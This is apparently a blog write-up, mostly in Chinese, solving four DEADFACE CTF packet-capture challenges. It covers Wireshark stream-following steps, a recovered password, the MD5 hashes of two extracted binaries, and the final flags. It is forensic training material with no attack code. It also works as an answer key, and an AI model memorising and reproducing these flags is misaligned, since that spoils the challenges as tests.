+<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
+<hr>
+<p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,搜索“warning”,找到一个请求<code>da-warning-message.jpg</code>的HTTP请求</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning.png" alt="A-Warning"></p>
+<p>找到该请求对应响应的数据包(16050),对着”JPEG File Interchange Format”右键,选择”显示分组字节”,即可看到flag</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-02.png" alt="image-20211106204519981"></p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-03.png" alt="image-20211106205413070"></p>
+<p><strong>flag:</strong><code>flag{angels-fear-to-tread}</code></p>
+<h1 id="Monster-from-the-Machine"><a href="#Monster-from-the-Machine" class="headerlink" title="Monster from the Machine"></a>Monster from the Machine</h1><p><em>Our person on the “inside” of Ghost Town was able to plant a packet sniffing device on Luciafer’s computer. Based on our initial analysis, we know that she was attempting to hack a computer in Lytton Labs, and we have some idea of what she was doing, but we need a more in-depth analysis. This is where YOU come in.</em></p>
+<p><em>We need YOU to help us analyze the packet capture. Look for relevant data to the potential attempted hack.</em></p>
+<p><em>To gather some information on the victim, investigate the victim’s computer activity. The “victim” was using a search engine to look up a name. Provide the name with standard capitalization: <code>flag{Jerry Seinfeld}</code>.</em></p>
+<p><em><a href="https://tinyurl.com/35a45kc3" target="_blank" rel="noopener">Download file</a></em></p>
+<p><em>SHA1: 6c0caf366dae3e03bcbd7338de0030812536894c</em></p>
+<hr>
+<p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,按照<code>HTTP</code>过滤</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine-00.png" alt="Monstrum ex Machine"><br>右键,点击”跟踪流”-&gt;”HTTP流”<br><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine.png" alt="Monstrum ex Machine"></p>
+<p><strong>flag:</strong><code>flag{Charles Geschickter}</code></p>
+<h1 id="Release-the-Crackin’"><a href="#Release-the-Crackin’" class="headerlink" title="Release the Crackin’!"></a>Release the Crackin’!</h1><p><em>Luciafer cracked a password belonging to the victim. Submit the flag as: <code>flag{password}</code>.</em></p>
+<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
+<hr>
+<p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,搜索<code>logged</code>,找到正确的密码</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/release_the_crackin.png" alt="Release the Crackin"></p>
+<p><strong>flag:</strong><code>flag{darkangel}</code></p>
+<h1 id="The-SUM-of-All-FEARS"><a href="#The-SUM-of-All-FEARS" class="headerlink" title="The SUM of All FEARS"></a>The SUM of All FEARS</h1><p><em>After hacking a victim’s computer, Luciafer downloaded several files, including two binaries with identical names, but with the extensions .exe and .bin (a Windows binary and a Linux binary, respectively).</em></p>
+<p><em>What are the MD5 hashes of the two tool programs? Submit both hashes as the flag, separated by a |: flag{ExeMD5|BinMD5}</em></p>
+<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
+<hr>
+<p>Luciafer下载了两个具有相同名称的二进制文件(分别以.exe和.bin结尾),两个文件的md5值拼接后即为flag</p>
+<p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>分析<code>pcap-challenge-final.pcapng</code>文件,发现是下载了<code>lytton-crypt.exe</code>和<code>lytton-crypt.bin</code>两个文件</p>
+<p>选中一个接收<code>lytton-crypt.exe</code>文件的数据包,右键点击“跟踪流”-&gt;”TCP流”</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-01.png" alt="lytton-crypt"></p>
+<p>然后点击“另存为”,保存为<code>lytton-crypt.exe</code></p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-02.png" alt="lytton-crypt"></p>
+<p>重复上述步骤,得到<code>lytton-crypt.bin</code>.然后计算两个文件的md5值</p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ md5 lytton-crypt.*
+MD5 (lytton-crypt.bin) = 4da8e81ee5b08777871e347a6b296953
+MD5 (lytton-crypt.exe) = 9cb9b11484369b95ce35904c691a5b28
+</code></pre>
+<p><strong>flag:</strong><code>flag{9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953}</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
